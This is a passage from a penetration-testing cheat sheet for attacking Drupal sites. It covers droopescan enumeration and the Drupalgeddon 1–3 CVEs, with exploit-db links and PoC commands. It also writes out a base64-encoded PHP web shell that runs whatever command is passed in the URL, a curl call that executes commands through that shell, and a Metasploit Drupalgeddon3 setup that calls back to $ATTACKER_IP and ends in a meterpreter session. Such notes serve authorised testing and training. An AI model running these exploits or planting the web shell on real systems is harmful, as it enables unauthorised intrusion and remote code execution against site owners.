- `droopescan scan drupal -u http://example.org/ -t 32`
- `find version > /CHANGELOG.txt`

### <span style="color:#50FA7B">Enumeration</span>
```bash
# Enumeration
sudo pip3 install droopescan
droopescan scan drupal -u http://drupal.$DOMAIN
```
## <span style="color:#8BE9FD">After login admin panel</span>
- RCE via PHP Filter Module (Drupal 7)
-  Installing PHP Filter in Drupal 8+

`you can get the shell using above methords search for any article for it
`
## <span style="color:#8BE9FD">Drupalgeddon 1 – CVE-2014-3704</span>
https://www.exploit-db.com/exploits/34992
- Affects: Drupal 7.0 – 7.31
- Type: Pre-auth SQL Injection
- Goal: If successfull it will create an admin user
```bash
python2 drupalgeddon.py -t http://drupal-qa.$DOMAIN -u $USER -p $PASS
```

## <span style="color:#8BE9FD">Drupalgeddon 2 – CVE-2018-7600</span>
https://www.exploit-db.com/exploits/44448
- Affects: Drupal < 7.58 and 8.5.1
- Type: Unauthenticated RCE via user registration
#### <span style="color:#FFB86C">Steps:</span>
- Run the PoC script:
```bash
python3 drupalgeddon2.py
```
- Confirm with:
```bash
curl http://drupal-dev.$DOMAIN/hello.txt
```
- Upload malicious PHP file:
```bash
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
```
- Decode & save:
```bash
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```
- Run the modified PoC to upload shell

```bash
curl http://drupal-dev.$DOMAIN/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

## <span style="color:#8BE9FD">Drupalgeddon 3 – CVE-2018-7602</span>
- Affects: Drupal 7.x and 8.x
- Type: Authenticated RCE
- Requires: Valid session cookie & node delete permission
#### <span style="color:#FFB86C">Steps:</span>
- Log in and get session cookie (SESSxxx=xxx).
Use Metasploit:
```bash
use exploit/multi/http/drupal_drupageddon3
set RHOSTS $VICTIM_IP
set VHOST drupal-acc.$DOMAIN
set DRUPAL_SESSION SESSxxx=xyz
set DRUPAL_NODE 1
set LHOST $ATTACKER_IP
exploit
```
Shell success:
```bash
meterpreter > getuid
www-data
```
